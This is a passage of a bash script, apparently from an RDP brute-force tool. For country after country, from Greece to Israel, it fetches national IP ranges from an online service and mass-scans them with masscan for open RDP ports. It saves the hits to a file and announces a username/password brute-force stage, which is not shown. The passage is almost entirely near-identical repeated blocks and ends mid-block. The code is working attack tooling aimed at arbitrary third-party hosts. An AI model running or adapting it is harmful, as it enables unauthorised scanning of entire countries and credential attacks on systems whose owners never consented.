echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "72" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GREECE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Greece://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "73" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GREENLAND |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Greenland://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "74" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GRENADA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Grenada://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "75" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GUAM |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Guam://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "76" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GUATEMALA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Guatemala://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "77" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GUINEA-BISSAU |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Guinea-bissau://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "78" ]; then
curl http://services.ce3c.be/ciprg/?countrys=HAITI |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Haiti://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "79" ]; then
curl http://services.ce3c.be/ciprg/?countrys=HOLY+SEE+%28VATICAN+CITY+STATE%29 |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Holy See (VATICAN City State)://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "80" ]; then
curl http://services.ce3c.be/ciprg/?countrys=HONDURAS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Honduras://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "81" ]; then
curl http://services.ce3c.be/ciprg/?countrys=HONG+KONG |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Hong Kong://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "82" ]; then
curl http://services.ce3c.be/ciprg/?countrys=HUNGARY |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Hungary://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "83" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ICELAND |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Iceland://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "84" ]; then
curl http://services.ce3c.be/ciprg/?countrys=INDIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/India://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "85" ]; then
curl http://services.ce3c.be/ciprg/?countrys=INDONESIA|grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Indonesia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "86" ]; then
curl http://services.ce3c.be/ciprg/?countrys=IRAN+%28ISLAMIC+REPUBLIC+OF%29%2C |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Iran (ISLAMIC Republic Of)://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "87" ]; then
curl http://services.ce3c.be/ciprg/?countrys=IRAQ |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Iraq://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "88" ]; then
curl http://services.ce3c.be/ciprg/?countrys=IRELAND |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Ireland://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "89" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ISRAEL |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Israel://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
